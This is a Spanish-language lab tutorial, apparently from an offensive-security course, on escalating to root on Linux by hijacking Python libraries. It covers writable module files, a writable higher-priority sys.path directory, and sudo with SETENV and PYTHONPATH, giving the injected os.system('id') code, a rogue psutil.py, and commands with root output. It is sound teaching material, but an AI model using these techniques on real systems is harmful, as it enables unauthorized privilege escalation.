Python es uno de los lenguajes de programación más populares y ampliamente utilizados en el mundo y ya ha reemplazado a muchos otros lenguajes en la industria IT. Hay muchas razones por las que Python es tan popular entre los programadores. Una de ellas es que los usuarios pueden trabajar con una vasta colección de libraries.

Muchas libraries se usan en Python y en muchos campos diferentes. Una de ellas es [NumPy](https://numpy.org/doc/stable/). `NumPy` es una extensión de código abierto para Python. El módulo proporciona funciones precompiladas para análisis numérico. En particular, permite manejar fácilmente listas y matrices extensas. Sin embargo, ofrece muchas otras características esenciales, como funciones de generación de números aleatorios, transformada de Fourier, álgebra lineal, entre otras. Además, NumPy proporciona muchas funciones matemáticas para trabajar con arrays y matrices.

Otra library es [Pandas](https://pandas.pydata.org/docs/). `Pandas` es una library para procesamiento y análisis de datos con Python. Extiende Python con estructuras de datos y funciones para procesar tablas de datos. Una fortaleza particular de Pandas es el análisis de series temporales.

Python tiene [the Python standard library](https://docs.python.org/3/library/), con muchos módulos incluidos en una instalación estándar de Python. Estos módulos proporcionan muchas soluciones que de otro modo tendríamos que trabajar laboriosamente escribiendo nuestros programas. Hay incontables horas de trabajo ahorradas aquí si uno tiene una visión general de los módulos disponibles y sus posibilidades. El sistema modular está integrado en esta forma por razones de rendimiento. Si uno tuviera automáticamente todas las posibilidades disponibles en la instalación básica de Python sin importar el módulo correspondiente, la velocidad de todos los programas Python se vería muy afectada.

En Python, podemos importar módulos con mucha facilidad:

### Importing Modules

```r
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

Hay muchas formas en las que podemos secuestrar una library de Python. Mucho depende del script y su contenido en sí. Sin embargo, hay tres vulnerabilidades básicas donde se puede usar el secuestro:

1. Permisos de escritura incorrectos
2. Library Path
3. Variable de entorno PYTHONPATH

---

## Wrong Write Permissions

Por ejemplo, podemos imaginar que estamos en el host de un desarrollador en la intranet de la empresa y que el desarrollador está trabajando con Python. Entonces, tenemos un total de tres componentes que están conectados. Este es el script de Python real que importa un módulo de Python y los privilegios del script, así como los permisos del módulo.

Es posible que uno u otro módulo de Python tenga permisos de escritura establecidos para todos los usuarios por error. Esto permite que el módulo de Python sea editado y manipulado para que podamos insertar comandos o funciones que produzcan los resultados que queremos. Si los permisos `SUID`/`SGID` se han asignado al script de Python que importa este módulo, nuestro código se incluirá automáticamente.

Si miramos los permisos establecidos del script `mem_status.py`, podemos ver que tiene un `SUID` establecido.

### Python Script

```r
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Entonces, podemos ejecutar este script con los privilegios de otro usuario, en nuestro caso, como `root`. También tenemos permiso para ver el script y leer su contenido.

### Python Script - Contents

```r
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Así que este script es bastante simple y solo muestra la memoria virtual disponible en porcentaje. También podemos ver en la segunda línea que este script importa el módulo `psutil` y usa la función `virtual_memory()`.

Así que podemos buscar esta función en la carpeta de `psutil` y verificar si este módulo tiene permisos de escritura para nosotros.

### Module Permissions

```r
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Estos permisos son más comunes en entornos de desarrollo donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.

### Module Contents

```r
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta es la parte en la library donde podemos insertar nuestro código. Se recomienda ponerlo justo al principio de la función. Allí podemos insertar todo lo que consideremos correcto y efectivo. Podemos importar el módulo `os` para fines de prueba, lo que nos permite ejecutar comandos del sistema. Con esto, podemos insertar el comando `id` y verificar durante la ejecución del script si se ejecuta el código insertado.

### Module Contents - Hijacking

```r
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Ahora podemos ejecutar el script con `sudo` y verificar si obtenemos el resultado deseado.

### Privilege Escalation

```r
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Éxito. Como podemos ver en el resultado anterior, pudimos secuestrar con éxito la library y hacer que nuestro código dentro de la función `virtual_memory()` se ejecute como `root`. Ahora que tenemos el resultado deseado, podemos editar la library nuevamente, pero esta vez, insertar una reverse shell que se conecte a nuestro host como `root`.

---

## Library Path

En Python, cada versión tiene un orden especificado en el que las libraries (`modules`) son buscadas e importadas. El orden en el que Python importa `modules` se basa en un sistema de prioridad, lo que significa que los paths más altos en la lista tienen prioridad sobre los que están más abajo en la lista. Podemos ver esto emitiendo el siguiente comando:

### PYTHONPATH Listing

```r
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder usar esta variante, son necesarias dos condiciones previas.

1. El módulo que es importado por el script está ubicado en uno de los paths de menor prioridad listados a través de la variable `PYTHONPATH`.
2. Debemos tener permisos de escritura en uno de los paths que tienen una mayor prioridad en la lista.

Por lo tanto, si el módulo importado está ubicado en un path más bajo en la lista y un path de mayor prioridad es editable por nuestro usuario, podemos crear un módulo nosotros mismos con el mismo nombre e incluir nuestras propias funciones deseadas. Dado que el path de mayor prioridad se lee primero y se examina para encontrar el módulo en cuestión, Python accede al primer hit que encuentra e importa antes de llegar al módulo original y previsto.

Para que esto tenga un poco más de sentido, continuemos con el ejemplo anterior y mostremos cómo se puede explotar esto. Anteriormente, el módulo `psutil` se importó en el script `mem_status.py`. Podemos ver la ubicación de instalación predeterminada de `psutil` emitiendo el siguiente comando:

### Psutil Default Installation Location

```r
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

En este ejemplo, podemos ver que `psutil` está instalado en el siguiente path: `/usr/local/lib/python3.8/dist-packages`. De nuestra lista anterior de la variable `PYTHONPATH`, tenemos una cantidad razonable de directorios para elegir y ver si puede haber alguna mala configuración en el entorno que nos permita tener acceso de `write` a cualquiera de ellos. Verifiquemos.

### Misconfigured Directory Permissions

```r
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Después de revisar todos los directorios listados, parece que el path `/usr/lib/python3.8` está mal configurado de manera que permite a cualquier usuario escribir en él. Cruzando valores con la variable `PYTHONPATH`, podemos ver que este path está más alto en la lista que el path en el que está instalado `psutil`. Intentemos abusar de esta mala configuración para crear nuestro propio módulo `psutil` que contenga nuestra propia función `virtual_memory()` maliciosa dentro del directorio `/usr/lib/python3.8`.

### Hijacked Module Contents - psutil.py

```r
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para llegar a este punto, necesitamos crear un archivo llamado `psutil.py` que contenga el contenido listado anteriormente en el directorio mencionado anteriormente. Es muy importante que nos aseguremos de que el módulo que creamos tenga el mismo nombre que el import, así como tener la misma función con el número correcto de argumentos pasados a ella como la función que pretendemos secuestrar. Esto es crítico ya que sin ninguna de estas condiciones siendo `verdaderas`, no podremos realizar este ataque. Después de crear este archivo que contiene el ejemplo de nuestro script de secuestro anterior, hemos preparado con éxito el sistema para la explotación.

Ejecutemos nuevamente el script `mem_status.py` usando `sudo` como en el ejemplo anterior.

### Privilege Escalation via Hijacking Python Library Path

```r
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver en el resultado, hemos obtenido ejecución como `root` al secuestrar el path del módulo a través de una mala configuración en los permisos del directorio `/usr/lib/python3.8`.

---

## PYTHONPATH Environment Variable

En la sección anterior, mencionamos el término `PYTHONPATH`, sin embargo, no explicamos completamente su uso e importancia respecto a la funcionalidad de Python. `PYTHONPATH` es una variable de entorno que indica qué directorio (o directorios) puede buscar Python para importar módulos. Esto es importante ya que si a un usuario se le permite manipular y establecer esta variable mientras ejecuta el binario de Python, puede redirigir efectivamente la funcionalidad de búsqueda de Python a una ubicación `user-defined` cuando se trata de importar módulos. Podemos ver si tenemos permisos para establecer variables de entorno para el binario de Python verificando nuestros permisos de `sudo`:

### Checking sudo permissions

```r
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como podemos ver en el ejemplo, se nos permite ejecutar `/usr/bin/python3` bajo los permisos de confianza de `sudo` y, por lo tanto, se nos permite establecer variables de entorno para usar con este binario al tener el flag `SETENV:` establecido. Es importante notar que, debido a la naturaleza confiable de `sudo`, cualquier variable de entorno definida antes de llamar al binario no está sujeta a ninguna restricción con respecto a poder establecer variables de entorno en el sistema. Esto significa que usando el binario `/usr/bin/python3`, podemos establecer efectivamente cualquier variable de entorno bajo el contexto de nuestro programa en ejecución. Intentemos hacerlo ahora usando el script `psutil.py` de la sección anterior.

### Privilege Escalation using PYTHONPATH Environment Variable

```r
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

En este ejemplo, movimos el script de Python anterior del directorio `/usr/lib/python3.8` a `/tmp`. Desde aquí, volvemos a llamar a `/usr/bin/python3` para ejecutar `mem_stats.py`, sin embargo, especificamos que la variable `PYTHONPATH` contenga el directorio `/tmp` para que obligue a Python a buscar ese directorio buscando el módulo `psutil` para importar. Como podemos ver, una vez más hemos ejecutado nuestro script bajo el contexto de root.